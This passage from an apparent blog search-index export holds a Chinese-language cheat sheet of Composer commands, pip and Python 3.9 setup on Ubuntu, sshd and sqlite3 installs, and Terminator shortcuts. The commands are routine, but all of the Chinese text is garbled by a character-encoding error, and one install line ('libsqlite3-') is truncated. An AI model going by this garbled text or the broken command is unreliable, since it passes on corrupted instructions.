<li><strong>â€“no-dev:</strong> è·³è¿‡ <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ã€‚</li>
<li><strong>â€“no-scripts:</strong> è·³è¿‡ <code>composer.json</code> æ–‡ä»¶ä¸­å®šä¹‰çš„è„šæœ¬ã€‚</li>
<li><strong>â€“no-plugins:</strong> å…³é—­ pluginsã€‚</li>
<li><strong>â€“no-progress:</strong> ç§»é™¤è¿›åº¦ä¿¡æ¯ï¼Œè¿™å¯ä»¥é¿å…ä¸€äº›ä¸å¤„ç†æ¢è¡Œçš„ç»ˆç«¯æˆ–è„šæœ¬å‡ºç°æ··ä¹±çš„æ˜¾ç¤ºã€‚</li>
<li><strong>â€“optimize-autoloader (-o):</strong> è½¬æ¢ PSR-0/4 autoloading åˆ° classmap å¯ä»¥è·å¾—æ›´å¿«çš„åŠ è½½æ”¯æŒã€‚ç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹å»ºè®®è¿™ä¹ˆåšï¼Œä½†ç”±äºè¿è¡Œéœ€è¦ä¸€äº›æ—¶é—´ï¼Œå› æ­¤å¹¶æ²¡æœ‰ä½œä¸ºé»˜è®¤å€¼ã€‚</li>
</ul>
<h4 id="æ›´æ–°-update"><a href="#æ›´æ–°-update" class="headerlink" title="æ›´æ–° update"></a>æ›´æ–° <code>update</code></h4><p>ä¸ºäº†è·å–ä¾èµ–çš„æœ€æ–°ç‰ˆæœ¬ï¼Œå¹¶ä¸”å‡çº§ <code>composer.lock</code> æ–‡ä»¶ï¼Œä½ åº”è¯¥ä½¿ç”¨ <code>update</code> å‘½ä»¤ã€‚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar update</span><br></pre></td></tr></table></figure>

<p>è¿™å°†è§£å†³é¡¹ç›®çš„æ‰€æœ‰ä¾èµ–ï¼Œå¹¶å°†ç¡®åˆ‡çš„ç‰ˆæœ¬å·å†™å…¥ <code>composer.lock</code>ã€‚</p>
<p>å¦‚æœä½ åªæ˜¯æƒ³æ›´æ–°å‡ ä¸ªåŒ…ï¼Œä½ å¯ä»¥åƒè¿™æ ·åˆ†åˆ«åˆ—å‡ºå®ƒä»¬ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar update vendor/package vendor/package2</span><br></pre></td></tr></table></figure>

<p>ä½ è¿˜å¯ä»¥ä½¿ç”¨é€šé…ç¬¦è¿›è¡Œæ‰¹é‡æ›´æ–°ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar update vendor/*</span><br></pre></td></tr></table></figure>

<h5 id="æ›´æ–°-å‚æ•°"><a href="#æ›´æ–°-å‚æ•°" class="headerlink" title="æ›´æ–°-å‚æ•°"></a>æ›´æ–°-å‚æ•°</h5><ul>
<li><strong>â€“prefer-source:</strong> å½“æœ‰å¯ç”¨çš„åŒ…æ—¶ï¼Œä» <code>source</code> å®‰è£…ã€‚</li>
<li><strong>â€“prefer-dist:</strong> å½“æœ‰å¯ç”¨çš„åŒ…æ—¶ï¼Œä» <code>dist</code> å®‰è£…ã€‚</li>
<li><strong>â€“dry-run:</strong> æ¨¡æ‹Ÿå‘½ä»¤ï¼Œå¹¶æ²¡æœ‰åšå®é™…çš„æ“ä½œã€‚</li>
<li><strong>â€“dev:</strong> å®‰è£… <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ï¼ˆè¿™æ˜¯ä¸€ä¸ªé»˜è®¤å€¼ï¼‰ã€‚</li>
<li><strong>â€“no-dev:</strong> è·³è¿‡ <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ã€‚</li>
<li><strong>â€“no-scripts:</strong> è·³è¿‡ <code>composer.json</code> æ–‡ä»¶ä¸­å®šä¹‰çš„è„šæœ¬ã€‚</li>
<li><strong>â€“no-plugins:</strong> å…³é—­ pluginsã€‚</li>
<li><strong>â€“no-progress:</strong> ç§»é™¤è¿›åº¦ä¿¡æ¯ï¼Œè¿™å¯ä»¥é¿å…ä¸€äº›ä¸å¤„ç†æ¢è¡Œçš„ç»ˆç«¯æˆ–è„šæœ¬å‡ºç°æ··ä¹±çš„æ˜¾ç¤ºã€‚</li>
<li><strong>â€“optimize-autoloader (-o):</strong> è½¬æ¢ PSR-0/4 autoloading åˆ° classmap å¯ä»¥è·å¾—æ›´å¿«çš„åŠ è½½æ”¯æŒã€‚ç‰¹åˆ«æ˜¯åœ¨ç”Ÿäº§ç¯å¢ƒä¸‹å»ºè®®è¿™ä¹ˆåšï¼Œä½†ç”±äºè¿è¡Œéœ€è¦ä¸€äº›æ—¶é—´ï¼Œå› æ­¤å¹¶æ²¡æœ‰ä½œä¸ºé»˜è®¤å€¼ã€‚</li>
<li><strong>â€“lock:</strong> ä»…æ›´æ–° lock æ–‡ä»¶çš„ hashï¼Œå–æ¶ˆæœ‰å…³ lock æ–‡ä»¶è¿‡æ—¶çš„è­¦å‘Šã€‚</li>
<li><strong>â€“with-dependencies</strong> åŒæ—¶æ›´æ–°ç™½åå•å†…åŒ…çš„ä¾èµ–å…³ç³»ï¼Œè¿™å°†è¿›è¡Œé€’å½’æ›´æ–°ã€‚</li>
</ul>
<h4 id="ç”³æ˜ä¾èµ–-require"><a href="#ç”³æ˜ä¾èµ–-require" class="headerlink" title="ç”³æ˜ä¾èµ– require"></a>ç”³æ˜ä¾èµ– <code>require</code></h4><p><code>require</code> å‘½ä»¤å¢åŠ æ–°çš„ä¾èµ–åŒ…åˆ°å½“å‰ç›®å½•çš„ <code>composer.json</code> æ–‡ä»¶ä¸­ã€‚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar require</span><br></pre></td></tr></table></figure>

<p>åœ¨æ·»åŠ æˆ–æ”¹å˜ä¾èµ–æ—¶ï¼Œ ä¿®æ”¹åçš„ä¾èµ–å…³ç³»å°†è¢«å®‰è£…æˆ–è€…æ›´æ–°ã€‚</p>
<p>å¦‚æœä½ ä¸å¸Œæœ›é€šè¿‡äº¤äº’æ¥æŒ‡å®šä¾èµ–åŒ…ï¼Œä½ å¯ä»¥åœ¨è¿™æ¡ä»¤ä¸­ç›´æ¥æŒ‡æ˜ä¾èµ–åŒ…ã€‚</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar require vendor/package:2.* vendor/package2:dev-master</span><br></pre></td></tr></table></figure>

<h5 id="ç”³æ˜ä¾èµ–-å‚æ•°"><a href="#ç”³æ˜ä¾èµ–-å‚æ•°" class="headerlink" title="ç”³æ˜ä¾èµ–-å‚æ•°"></a>ç”³æ˜ä¾èµ–-å‚æ•°</h5><ul>
<li><strong>â€“prefer-source:</strong> å½“æœ‰å¯ç”¨çš„åŒ…æ—¶ï¼Œä» <code>source</code> å®‰è£…ã€‚</li>
<li><strong>â€“prefer-dist:</strong> å½“æœ‰å¯ç”¨çš„åŒ…æ—¶ï¼Œä» <code>dist</code> å®‰è£…ã€‚</li>
<li><strong>â€“dev:</strong> å®‰è£… <code>require-dev</code> å­—æ®µä¸­åˆ—å‡ºçš„åŒ…ã€‚</li>
<li><strong>â€“no-update:</strong> ç¦ç”¨ä¾èµ–å…³ç³»çš„è‡ªåŠ¨æ›´æ–°ã€‚</li>
<li><strong>â€“no-progress:</strong> ç§»é™¤è¿›åº¦ä¿¡æ¯ï¼Œè¿™å¯ä»¥é¿å…ä¸€äº›ä¸å¤„ç†æ¢è¡Œçš„ç»ˆç«¯æˆ–è„šæœ¬å‡ºç°æ··ä¹±çš„æ˜¾ç¤ºã€‚</li>
<li><strong>â€“update-with-dependencies</strong> ä¸€å¹¶æ›´æ–°æ–°è£…åŒ…çš„ä¾èµ–ã€‚</li>
</ul>
<h4 id="å…¨å±€æ‰§è¡Œ-global"><a href="#å…¨å±€æ‰§è¡Œ-global" class="headerlink" title="å…¨å±€æ‰§è¡Œ global"></a>å…¨å±€æ‰§è¡Œ <code>global</code></h4><p><code>global</code> å‘½ä»¤å…è®¸ä½ åœ¨ <a href="https://docs.phpcomposer.com/03-cli.html#COMPOSER_HOME" target="_blank" rel="noopener">COMPOSER_HOME</a> ç›®å½•ä¸‹æ‰§è¡Œå…¶å®ƒå‘½ä»¤ï¼Œåƒ <code>install</code>ã€<code>require</code> æˆ– <code>update</code>ã€‚</p>
<p>å¹¶ä¸”å¦‚æœä½ å°† <code>$COMPOSER_HOME/vendor/bin</code> åŠ å…¥åˆ°äº† <code>$PATH</code> ç¯å¢ƒå˜é‡ä¸­ï¼Œä½ å°±å¯ä»¥ç”¨å®ƒåœ¨å‘½ä»¤è¡Œä¸­å®‰è£…å…¨å±€åº”ç”¨ï¼Œä¸‹é¢æ˜¯ä¸€ä¸ªä¾‹å­ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar global require fabpot/php-cs-fixer:dev-master</span><br></pre></td></tr></table></figure>

<p>ç°åœ¨ <code>php-cs-fixer</code> å°±å¯ä»¥åœ¨å…¨å±€èŒƒå›´ä½¿ç”¨äº†ï¼ˆå‡è®¾ä½ å·²ç»è®¾ç½®äº†ä½ çš„ PATHï¼‰ã€‚å¦‚æœç¨åä½ æƒ³æ›´æ–°å®ƒï¼Œä½ åªéœ€è¦è¿è¡Œ <code>global update</code>ï¼š</p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line">php composer.phar global update</span><br></pre></td></tr></table></figure>

<h3 id="ubuntuå®‰è£…åŠæ›´æ–°-pip2-pip3"><a href="#ubuntuå®‰è£…åŠæ›´æ–°-pip2-pip3" class="headerlink" title="ubuntuå®‰è£…åŠæ›´æ–° pip2 pip3"></a>ubuntuå®‰è£…åŠæ›´æ–° pip2 pip3</h3><p>pip2</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python-pip</span><br><span class="line">python2 -m pip install -U pip</span><br></pre></td></tr></table></figure>

<p>pip3</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">sudo apt install python3-pip</span><br><span class="line">pip3 install --upgrade pip</span><br></pre></td></tr></table></figure>

<h3 id="pipå®‰è£…requirements"><a href="#pipå®‰è£…requirements" class="headerlink" title="pipå®‰è£…requirements"></a>pipå®‰è£…requirements</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirement.txt</span><br></pre></td></tr></table></figure>

<h3 id="ubuntuå®‰è£…python3-9"><a href="#ubuntuå®‰è£…python3-9" class="headerlink" title="ubuntuå®‰è£…python3.9"></a>ubuntuå®‰è£…python3.9</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo add-apt-repository ppa:deadsnakes&#x2F;ppa</span><br><span class="line">sudo apt update</span><br><span class="line">sudo apt install python3.9</span><br></pre></td></tr></table></figure>

<p><a href="https://blog.csdn.net/peiwang245/article/details/98317863" target="_blank" rel="noopener">https://blog.csdn.net/peiwang245/article/details/98317863</a></p>
<p>pipé—®é¢˜ï¼š</p>
<p><a href="https://blog.csdn.net/sudakuang/article/details/101372007?spm=1001.2101.3001.6650.10&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link" target="_blank" rel="noopener">https://blog.csdn.net/sudakuang/article/details/101372007?spm=1001.2101.3001.6650.10&amp;utm_medium=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link&amp;depth_1-utm_source=distribute.pc_relevant.none-task-blog-2%7Edefault%7ECTRLIST%7Edefault-10.no_search_link</a></p>
<p><a href="https://blog.csdn.net/ZZQHELLO2018/article/details/106998144" target="_blank" rel="noopener">https://blog.csdn.net/ZZQHELLO2018/article/details/106998144</a></p>
<h3 id="ubuntu-åˆ é™¤Trash"><a href="#ubuntu-åˆ é™¤Trash" class="headerlink" title="ubuntu åˆ é™¤Trash"></a>ubuntu åˆ é™¤Trash</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo rm -rf ~&#x2F;.local&#x2F;share&#x2F;Trash&#x2F;*</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu-å®‰è£…-sshd"><a href="#ubuntu-å®‰è£…-sshd" class="headerlink" title="ubuntu å®‰è£… sshd"></a>ubuntu å®‰è£… sshd</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt install openssh-server</span><br><span class="line">sudo service ssh start</span><br></pre></td></tr></table></figure>

<h3 id="ubuntu-å®‰è£…-sqlite3"><a href="#ubuntu-å®‰è£…-sqlite3" class="headerlink" title="ubuntu å®‰è£… sqlite3"></a>ubuntu å®‰è£… sqlite3</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install sqlite3</span><br><span class="line">sudo apt-get install libsqlite3-</span><br></pre></td></tr></table></figure>



<h3 id="ubuntu-å®‰è£…terminatoråˆ†å±"><a href="#ubuntu-å®‰è£…terminatoråˆ†å±" class="headerlink" title="ubuntu å®‰è£…terminatoråˆ†å±"></a>ubuntu å®‰è£…terminatoråˆ†å±</h3><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">sudo apt-get install terminator</span><br></pre></td></tr></table></figure>

<ul>
<li>å¿«æ·é”®</li>
</ul>
<p>Ctrl+Shift+O<br>  Split terminals Horizontally.ï¼ˆä¸Šä¸‹å¼€æ–°çª—å£ï¼‰<br>Ctrl+Shift+E<br>  Split terminals Vertically.ï¼ˆå‚ç›´å¼€æ–°çª—å£ï¼‰<br>Ctrl+Shift+Right<br>  Move parent dragbar Right.ï¼ˆæ”¾å¤§å½“å‰çª—å£ å‘å³ï¼‰<br>Ctrl+Shift+Left<br>  Move parent dragbar Left.<br>Ctrl+Shift+Up<br>  Move parent dragbar Up.<br>Ctrl+Shift+Down<br>  Move parent dragbar Down.<br>Ctrl+Shift+W<br>  Close the current terminal.<br>Alt+Up<br>  Move to the terminal above the current one.ï¼ˆåˆ‡æ¢å½“å‰çª—å£ï¼‰<br>Alt+Down<br>  Move to the terminal below the current one.<br>Alt+Left<br>  Move to the terminal left of the current one.<br>Alt+Right<br>  Move to the terminal right of the current one.<br>Ctrl+Shift+S<br>  Hide/Show Scrollbar.ï¼ˆéšè—æ»šåŠ¨æ¡ï¼‰<br>Ctrl+Shift+F<br>  Search within terminal scrollback<br>Ctrl+Shift+N or Ctrl+Tab<br>  Move to next terminal within the same tab, use Ctrl+PageDown to move to the next tab. If cycle_term_tab is False, cycle within the same tab will be disabled<br>Ctrl+Shift+P or Ctrl+Shift+Tab<br>  Move to previous terminal within the same tab, use Ctrl+PageUp to move to the previous tab. If cycle_term_tab is False, cycle within the same tab will be disabled<br>Ctrl+Shift+C<br>  Copy selected text to clipboard<br>Ctrl+Shift+V<br>  Paste clipboard text<br>Ctrl+Shift+Q<br>  Quits Terminator<br>Ctrl+Shift+X ï¼ˆæœ€å¤§åŒ–å½“å‰çª—å£ï¼‰<br>  Toggle between showing all terminals and only showing the current one (maximise).<br>Ctrl+Shift+Z<br>  Toggle between showing all terminals and only showing a scaled version of the current one (zoom).<br>Ctrl+Shift+T<br>  Open new tab<br>Ctrl+Shift+Alt+T<br>  Open new tab at root level, if using extreme_tabs.<br>Ctrl+PageDown<br>  Move to next Tab<br>Ctrl+PageUp<br>  Move to previous Tab<br>Ctrl+Shift+PageDown<br>  Swap tab position with next Tab<br>Ctrl+Shift+PageUp<br>  Swap tab position with previous Tab<br>Ctrl+Shift+F<br>  Open buffer search bar to find substrings in the scrollback buffer. Hit Escape to cancel.<br>Ctrl+Plus (+)<br>  Increase font size. Note: this may require you to press shift, depending on your keyboard<br>Ctrl+Minus (-)<br>  Decrease font size. Note: this may require you to press shift, depending on your keyboard<br>Ctrl+Zero (0)<br>  Restore font size to original setting.<br>F11<br>  Toggle fullscreenï¼ˆæ”¾å¤§å½“å‰çª—å£ï¼‰<br>Ctrl+Shift+R<br>  Reset terminal state<br>Ctrl+Shift+G<br>  Reset terminal state and clear window</p>
]]></content>
      <tags>
        <tag>misc</tag>
      </tags>
  </entry>
</search>
